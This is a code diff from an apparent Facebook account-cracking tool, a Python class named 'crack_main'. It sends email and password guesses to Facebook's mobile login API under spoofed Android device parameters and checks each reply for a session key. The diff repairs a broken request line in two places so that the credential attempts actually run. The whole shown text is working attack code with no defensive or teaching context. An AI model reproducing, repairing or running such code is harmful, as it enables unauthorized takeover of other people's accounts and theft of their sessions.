@@ -561,7 +561,7 @@ class crack_main():
                                 data = {'adid': adid, 'email': iid, 'password': pas, 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': model, 'device_id': adid, 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
 
                                 url = 'https://www.facebook.com/method/auth.login'
-                                po = requests.post(https://web.facebook.com/?_rdc=1&_rdr', cookies=cookies, headers=headers).text
+                                po = requests.post(url,data=data,headers=head).text
                                 q = json.loads(po)
                                 #print(po)
                                 if 'session_key' in po:
@@ -668,7 +668,7 @@ class crack_main():
                                 data = {'adid': adid, 'email': iid, 'password': pas, 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': model, 'device_id': adid, 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
 
                                 url = 'https://www.facebook.com/method/auth.login'
-                                po = requests.post(https://web.facebook.com/?_rdc=1&_rdr', cookies=cookies, headers=headers).text
+                                po = requests.post(url,data=data,headers=head).text
                                 q = json.loads(po)
                                 #print(po)
                                 if 'session_key' in po:
